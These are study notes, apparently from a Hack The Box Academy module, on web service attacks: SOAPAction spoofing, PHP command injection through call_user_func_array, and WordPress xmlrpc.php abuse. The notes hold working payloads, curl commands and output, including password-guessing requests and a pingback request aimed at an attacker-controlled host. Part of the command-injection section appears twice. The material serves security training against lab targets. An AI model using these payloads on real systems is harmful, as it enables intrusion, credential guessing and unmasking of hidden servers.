# Web Service Attacks

## SOAPAction Spoofing

Suppose we are assessing a SOAP web service, whose WSDL file resides in `http://<TARGET IP>:3002/wsdl?wsdl`.

The service's WSDL file can be found below

```shell-session
eldeim@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl 

<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/" 
  xmlns:s="http://www.w3.org/2001/XMLSchema" 
  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" 
  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" 
  xmlns:tns="http://tempuri.org/" 
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" 
  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  
  <wsdl:types>
```

The first thing to pay attention to is the following.

```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

We can see a SOAPAction operation called _ExecuteCommand_.

Let us take a look at the parameters.

```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

We notice that there is a _cmd_ parameter. Let us build a Python script to issue requests (save it as `client.py`). Note that the below script will try to have the SOAP service execute a `whoami` command.

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

The Python script can be executed, as follows.

```shell-session
eldeim@htb[/htb]$ python3 client.py
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
```

***

## Command Injection

Suppose we are assessing such a connectivity-checking service residing in `http://<TARGET IP>:3003/ping-server.php/ping`. Suppose we have also been provided with the source code of the service.

```shell-session
eldeim@htb[/htb]$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
index.php
ping-server.php
```

&#x20; Command Injection

You can test the command injection vulnerability as follows.

* A function called _ping_ is defined, which takes two arguments _host\_url\_ip_ and _packets_. The request should look similar to the following. `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3`. To check that the web service is sending ping requests, execute the below in your attacking machine and then issue the request.
  *   &#x20;&#x20;

      ```shell-session
      eldeim@htb[/htb]$ sudo tcpdump -i tun0 icmp
       tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
       listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
       11:10:22.521853 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 1, length 64
       11:10:22.521885 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 1, length 64
       11:10:23.522744 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 2, length 64
       11:10:23.522781 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 2, length 64
       11:10:24.523726 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 3, length 64
       11:10:24.523758 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 3, length 64
      ```
* The code also checks if the _packets_'s value is more than 4, and it does that via an array. So if we issue a request such as `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3333`, we're going to get an _Only 1-4 packets!_ error.
* A variable called _cmd_ is then created, which forms the ping command to be executed. Two values are "parsed", _packets_ and _host\_url_. [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) is used to escape the _host\_url_'s value. According to PHP's function reference, _escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() shell\_exec() and the backtick operator._ If the _host\_url_'s value was not escaped, the below could happen. ![Terminal output showing 'ping google.com' with error: 'Name or service not known', groups include root, adm, dialout, wireshark, kaboxer.](https://academy.hackthebox.com/storage/modules/160/1.png)
* The command specified by the _cmd_ parameter is executed with the help of the _shell\_exec()_ PHP function.
* If the request method is GET, an existing function can be called with the help of [call\_user\_func\_array()](https://www.php.net/manual/en/function.call-user-func-array.php). The _call\_user\_func\_array()_ function is a special way to call an existing PHP function. It takes a function to call as its first parameter, then takes an array of parameters as its second parameter. This means that instead of `http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3` an attacker could issue a request as follows. `http://<TARGET IP>:3003/ping-server.php/system/ls`. This constitutes a command injection vulnerability!

```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

Code: php

> **Note**: The web service we are about to assess does not follow the web service architectural designs/approaches we covered. It is quite close to a normal web service, though, as it provides its functionality in a programmatic way, and different clients can use it for connectivity-checking purposes.

```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url_ip);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

* A function called _ping_ is defined, which takes two arguments _host\_url\_ip_ and _packets_. The request should look similar to the following. `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3`. To check that the web service is sending ping requests, execute the below in your attacking machine and then issue the request.

```shell-session
eldeim@htb[/htb]$ sudo tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 11:10:22.521853 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 1, length 64
 11:10:22.521885 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 1, length 64
 11:10:23.522744 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 2, length 64
 11:10:23.522781 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 2, length 64
 11:10:24.523726 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 3, length 64
 11:10:24.523758 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 3, length 64
```

* The code also checks if the _packets_'s value is more than 4, and it does that via an array. So if we issue a request such as `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3333`, we're going to get an _Only 1-4 packets!_ error.
* A variable called _cmd_ is then created, which forms the ping command to be executed. Two values are "parsed", _packets_ and _host\_url_. [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) is used to escape the _host\_url_'s value. According to PHP's function reference, _escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include exec(), system() shell\_exec() and the backtick operator._ If the _host\_url_'s value was not escaped, the below could happen.

&#x20;![](<../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1).png>)

* The command specified by the _cmd_ parameter is executed with the help of the _shell\_exec()_ PHP function.
* If the request method is GET, an existing function can be called with the help of [call\_user\_func\_array()](https://www.php.net/manual/en/function.call-user-func-array.php). The _call\_user\_func\_array()_ function is a special way to call an existing PHP function. It takes a function to call as its first parameter, then takes an array of parameters as its second parameter. This means that instead of `http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3` an attacker could issue a request as follows. `http://<TARGET IP>:3003/ping-server.php/system/ls`. This constitutes a command injection vulnerability!

You can test the command injection vulnerability as follows.

```shell-session
eldeim@htb[/htb]$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
index.php
ping-server.php
```

***

## Attacking WordPress 'xmlrpc.php'

Suppose we are assessing the security of a WordPress instance residing in _http://blog.inlanefreight.com_. Through enumeration activities, we identified a valid username, `admin`, and that `xmlrpc.php` is enabled. Identifying if `xmlrpc.php` is enabled is as easy as requesting `xmlrpc.php` on the domain we are assessing.

We can mount a password brute-forcing attack through `xmlrpc.php`, as follows.

```shell-session
eldeim@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Above, you can see a successful login attempt through `xmlrpc.php`.

We will receive a `403 faultCode` error if the credentials are not valid.

```shell-session
eldeim@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>WRONG-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

You may ask how we identified the correct method to call (_system.listMethods_). We did that by going through the well-documented [Wordpress code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with `xmlrpc.php`, as follows.

```shell-session
eldeim@htb[/htb]$ curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Inside the list of available methods above, [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API) is included. `pingback.ping` allows for XML-RPC pingbacks. According to WordPress, _a_ [_pingback_](https://wordpress.com/support/comments/pingbacks/) _is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks._

Unfortunately, if pingbacks are available, they can facilitate:

* IP Disclosure - An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
* Cross-Site Port Attack (XSPA) - An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
* Distributed Denial of Service Attack (DDoS) - An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.

Find below how an IP Disclosure attack could be mounted if `xmlrpc.php` is enabled and the `pingback.ping` method is available. XSPA and DDoS attacks can be mounted similarly.

<mark style="background-color:yellow;">Suppose that the WordPress instance residing in</mark> <mark style="background-color:yellow;"></mark>_<mark style="background-color:yellow;">http://blog.inlanefreight.com</mark>_ <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">is protected by Cloudflare. As we already identified, it also has</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">`xmlrpc.php`</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">enabled, and the</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">`pingback.ping`</mark> <mark style="background-color:yellow;"></mark><mark style="background-color:yellow;">method is available.</mark>

As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from _http://blog.inlanefreight.com_, verifying the pingback and exposing _http://blog.inlanefreight.com_'s public IP address.

```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```

If you have access to our [Hacking Wordpress](https://academy.hackthebox.com/module/details/17) module, please note that you won't be able to exploit the availability of the `pingback.ping` method against the related section's target, due to egress restrictions.
